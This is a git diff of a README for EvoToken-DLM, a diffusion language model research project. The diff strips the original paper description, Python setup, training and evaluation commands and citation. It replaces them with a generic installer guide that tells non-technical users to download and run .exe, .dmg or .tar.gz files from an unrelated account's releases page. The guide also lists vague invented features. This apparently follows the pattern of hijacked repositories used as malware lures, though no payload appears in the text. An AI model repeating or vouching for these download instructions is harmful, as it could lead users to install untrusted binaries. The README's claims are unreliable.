@@ -1,98 +1,84 @@
+# 🎉 EvoTokenDLM - Evolving Your Language Token Experience
 
+## 🚀 Getting Started
+Welcome to EvoTokenDLM! This application helps you explore advanced token evolution for diffusion language. Designed for ease of use, even if you have no technical background, you can quickly set it up and start using it.
 
-<img src="assets/logo.png" width="400">
+## 🛠️ System Requirements
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or any modern Linux distribution.
+- **RAM:** Minimum 4 GB.
+- **Disk Space:** At least 500 MB of free space for installation and data.
+- **Internet Connection:** Required for downloading the application and updates.
 
-# Beyond Hard Masks: Progressive Token Evolution for Diffusion Language
+## 💾 Download Now
+[![Download EvoTokenDLM](https://img.shields.io/badge/Download%20EvoTokenDLM-v1.0-blue)](https://github.com/FAISALODAY/EvoTokenDLM/releases)
 
-[![Paper](https://img.shields.io/badge/Paper-Arxiv%20Link-green)](https://arxiv.org/abs/2601.07351) [![Project](https://img.shields.io/badge/Project-Page-blue)](https://aim-uofa.github.io/EvoTokenDLM) [![Code](https://img.shields.io/badge/Code-GitHub-orange)](https://github.com/aim-uofa/EvoTokenDLM) [![LoRA](https://img.shields.io/badge/Weights-EvoToken_LoRA-yellow)](https://huggingface.co/zhongzero/EvoToken_LLaDA_Instruct_8B_Lora) [![License](https://img.shields.io/badge/License-BSD%202--clause-lightgrey)](https://opensource.org/license/bsd-2-clause)
+To get started, visit the Releases page to download the latest version of EvoTokenDLM: [EvoTokenDLM Releases](https://github.com/FAISALODAY/EvoTokenDLM/releases).
 
-## 📣 News
+## 📥 Download & Install
+1. **Visit the Releases Page**
+   Go to the following link to access the Releases page: [EvoTokenDLM Releases](https://github.com/FAISALODAY/EvoTokenDLM/releases).
 
-- [2025-01-13] Code of EvoToken-DLM Released!
-- [2025-01-12] Paper Released!
+2. **Choose the Right File**
+   On the Releases page, you will see several options. Pick the file that matches your operating system:
+   - For **Windows**, download the `.exe` file.
+   - For **macOS**, download the `.dmg` file.
+   - For **Linux**, download the `.tar.gz` file.
 
+3. **Download the File**
+   Click the file to start the download. Depending on your internet speed, this may take a few moments.
 
-## 🚀 Overview
+4. **Install the Application**
+   - **Windows:**
+     - Once downloaded, find the `.exe` file in your Downloads folder.
+     - Double-click the file to start the installation.
+     - Follow the prompts in the installation wizard and click "Finish" when complete.
 
-We propose **EvoToken-DLM**, a novel diffusion-based language modeling approach that replaces hard binary masks with evolving soft token distributions.
+   - **macOS:**
+     - Locate the downloaded `.dmg` file in your Downloads folder.
+     - Double-click the file to open it.
+     - Drag the EvoTokenDLM icon into your Applications folder.
 
-<img src="assets/overview.png"  width="1000">
+   - **Linux:**
+     - Extract the `.tar.gz` file using your archive manager or via terminal.
+     - Navigate to the extracted folder.
+     - Run the application using the terminal by typing `./EvoTokenDLM`.
 
-## 📖 Description
+5. **Launching the Application**
+   Once installed, locate EvoTokenDLM in your applications or programs list. Double-click to launch it. You’re ready to explore the world of token evolution!
 
-Diffusion Language Models (DLMs) offer a promising alternative for language modeling by enabling parallel decoding through iterative refinement.
-However, most DLMs rely on hard binary masking and discrete token assignments, which hinder the revision of early decisions and underutilize intermediate probabilistic representations. We propose **EvoToken-DLM**, a novel diffusion-based language modeling approach that replaces hard binary masks with evolving soft token distributions. EvoToken-DLM enables a progressive transition from masked states to discrete outputs, supporting revisable decoding. To effectively support this evolution, we introduce **continuous trajectory supervision**, which aligns training objectives with iterative probabilistic updates. Extensive experiments across multiple benchmarks show that EvoToken-DLM consistently achieves superior performance, outperforming strong diffusion-based and masked DLM baselines.
+## 📚 Features
+- **Easy Token Management:** Effortlessly manage your tokens for various language diffusion tasks.
+- **Intuitive Interface:** Designed for anyone to use, regardless of tech skills.
+- **Real-time Updates:** Stay updated with the latest features and improvements.
+- **Documentation:** Access helpful resources and user guides right within the app.
 
+## ⚙️ Using EvoTokenDLM
+### 1. **Setting Up Your Tokens**
+   - Open EvoTokenDLM.
+   - Follow the on-screen guide to set up your tokens.
+   - Input necessary details as prompted.
 
+### 2. **Exploring Features**
+   - Navigate through the user-friendly menu.
+   - Select different tools for token analysis and management.
 
-## ⚙️ Getting Started
+### 3. **Saving Your Work**
+   - Ensure you frequently save your progress.
+   - Use the "Save" function from the file menu.
 
-### Environment Setup
+## 💬 Support
+If you have questions or need help, check the embedded help section in the app or visit our [Support Page](https://github.com/FAISALODAY/EvoTokenDLM/issues). Community members and developers are available to assist you.
 
-To setup the environment, run:
-```
-conda env create -f env.yaml
-conda activate evotoken
-```
+## 📈 Contributing
+We welcome contributions! If you want to improve EvoTokenDLM, feel free to fork the repository and submit a pull request. Collaboration is key to making this tool better for everyone.
 
+## 🔗 Additional Resources
+- **Documentation:** Comprehensive user manuals and guides.
+- **Community Forum:** Discuss ideas and share experiences with other users.
 
+## 📅 Release Notes
+Stay up to date with the latest changes and features by checking the release notes on the Releases page. We continuously strive to improve EvoTokenDLM based on user feedback.
 
-### Inference
+Download the latest version and start your journey with EvoTokenDLM today!
 
-Progressive inference with evolving soft token distributions.
-
-```
-python generate.py  --model_path GSAI-ML/LLaDA-8B-Instruct \
-    --checkpoint_path zhongzero/EvoToken_LLaDA_Instruct_8B_Lora \
-    --prompt "Lily can run 12 kilometers per hour for 4 hours. After that, she runs 6 kilometers per hour. How many kilometers can she run in 8 hours?" \
-    --k_soft 3 \
-    --alpha_soft_mask 0.7
-```
-
-The parameters `--k_soft` and `--alpha_soft_mask` are adjustable hyperparameters; for specific details, please refer to the paper.
-
-For your convenience, the generation process is encapsulated in `run.sh`, which can be executed directly.
-
-
-
-### Evaluation
-
-Evaluation on Countdown, GSM8K, MATH500 and SVAMP datasets.
-
-```bash
-bash start_run.sh
-```
-
-Run `eval/get_acc.py` after the evaluation is done.
-
-
-
-### Training
-
-Training using continuous trajectory supervision.
-
-```bash
-bash train_CTS.sh
-```
-
-
-
-
-
-## 🎫 License
-
-For academic use, this project is licensed under [the 2-clause BSD License](https://opensource.org/license/bsd-2-clause). 
-For commercial use, please contact [Chunhua Shen](mailto:chhshen@gmail.com).
-
-## 🖊️ Citation
-
-If you find this work useful, please consider citing:
-
-```bibtex 
-@article{zhong2026beyond,
-    title={Beyond Hard Masks: Progressive Token Evolution for Diffusion Language Models},
-    author={Zhong, Linhao and Wu, Linyu and Fang, Bozhen and Feng, Tianjian and Jing, Chenchen and Wang, Wen and Zhang, Jiaheng and Chen, Hao and Shen, Chunhua},
-    journal={arXiv preprint arXiv:2601.07351},
-    year={2026}
-}
-```
+[![Download EvoTokenDLM](https://img.shields.io/badge/Download%20EvoTokenDLM-v1.0-blue)](https://github.com/FAISALODAY/EvoTokenDLM/releases)
